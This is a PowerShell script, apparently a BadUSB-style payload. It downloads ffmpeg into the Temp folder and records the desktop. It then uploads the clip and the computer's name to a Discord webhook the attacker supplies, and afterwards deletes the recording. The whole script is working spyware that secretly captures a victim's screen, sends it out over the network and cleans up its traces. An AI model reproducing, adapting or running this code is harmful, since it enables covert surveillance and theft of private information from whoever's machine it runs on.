<#==================== RECORD SCREEN TO DISCORD =========================

SYNOPSIS
This script records the screen for a specified time to a mkv file,
then sends the file to a discord webhook.
(use -t to specify time limit eg. RecordScreen -t 30)
records 10 seconds by default

USAGE
1. Replace YOUR_WEBHOOK_HERE with your discord webhook.
2. Run script

#>

$hookurl = 'YOUR_WEBHOOK_HERE' # can be shortened
if ($hookurl.Ln -ne 121){$hookurl = (irm $hookurl).url}

Function RecordScreen{
    param ([int[]]$t)
    if ($t.Length -eq 0){$t = 10}
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)){  
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":hourglass: ``Downloading ffmpeg.exe. Please wait...`` :hourglass:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
        $zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-6.1.1-essentials_build.zip'
        $tempDir = "$env:temp"
        $zipFilePath = Join-Path $tempDir 'ffmpeg-6.1.1-essentials_build.zip'
        $extractedDir = Join-Path $tempDir 'ffmpeg-6.1.1-essentials_build'
        Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
        Remove-Item -Path $zipFilePath -Force
        Remove-Item -Path $extractedDir -Recurse -Force
    }
    $mkvPath = "$env:Temp\ScreenClip.mkv"
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen (24mb Clip)`` :arrows_counterclockwise:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    .$env:Temp\ffmpeg.exe -f gdigrab -framerate 5 -i desktop -fs 24000000 $mkvPath
    curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
    sleep 1
    rm -Path $mkvPath -Force
}

RecordScreen

